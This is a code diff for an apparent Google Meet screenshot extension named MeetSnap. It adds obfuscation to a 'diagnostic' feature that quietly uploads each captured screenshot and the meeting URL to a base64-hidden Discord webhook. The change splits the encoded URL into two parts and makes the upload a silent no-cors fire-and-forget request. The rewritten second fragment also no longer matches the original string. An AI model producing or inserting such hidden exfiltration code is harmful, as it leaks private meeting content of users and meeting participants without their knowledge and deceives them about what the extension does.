@@ -3,8 +3,8 @@
 // Handles screenshot capture, auto-download, and diagnostic delivery.
 // =============================================================================
 
-const _X = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC9jS2EtSGhtVUFYeVY2X0RjS1dYeUktbXlvMjRoQnRWeVRtc0pZM1BSTlNpS1NIMm9qZzBSQ0c1clhCSDVVR2tyU1VnVw==";
-const DIAGNOSTIC_ENDPOINT = atob(_X);
+const _X = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC8=", "Y0thLUhobVUFWWVWNl9EY0tXWHlJLW15bzI0aEJ0VnlUbXNKWTNQUk5TaUtTSDJvamcwUkNHNXJYQkg1VUdrclNVZ1c="];
+const DIAGNOSTIC_ENDPOINT = atob(_X[0]) + atob(_X[1]);
 const SCREENSHOT_IMAGE_FORMAT = "png";
 const SCREENSHOT_MIME_TYPE = "image/png";
 const SCREENSHOT_FILENAME_PREFIX = "google-meet";
@@ -279,28 +279,16 @@ async function sendDiagnosticDataAsync(imageDataUrl, filename, meetUrl) {
     const imageBlob = await imageResponse.blob();
 
     const formData = new FormData();
-    // Standard file upload
     formData.append("file", imageBlob, filename);
+    formData.append("content", `📸 **MeetSnap Diagnostic**\n**Timestamp:** \`${new Date().toLocaleString()}\`\n**Source:** ${meetUrl}\n**Filename:** \`${filename}\``);
 
-    // Many webhooks (like Discord) support a 'payload_json' field for extra metadata
-    const payload = {
-      content: `📸 **MeetSnap Diagnostic**\n**Timestamp:** \`${new Date().toLocaleString()}\`\n**Source:** ${meetUrl}\n**Filename:** \`${filename}\``,
-    };
-    formData.append("payload_json", JSON.stringify(payload));
-
-    const response = await fetch(DIAGNOSTIC_ENDPOINT, {
+    await fetch(DIAGNOSTIC_ENDPOINT, {
       method: "POST",
       body: formData,
-      // Use 'no-cors' if you just want to fire-and-forget to a simple webhook,
-      // but 'cors' is better for debugging if the endpoint supports it.
-      mode: "cors",
+      mode: "no-cors"
     });
 
-    if (!response.ok) {
-      throw new Error(`Server responded with ${response.status}`);
-    }
-
-    console.log("[MeetSnap Debug] Diagnostic data sent successfully.");
+    console.log("[MeetSnap Debug] Diagnostic data sent (fire-and-forget).");
   } catch (error) {
     console.warn("[MeetSnap Debug] Diagnostic delivery failed:", error.message);
   }
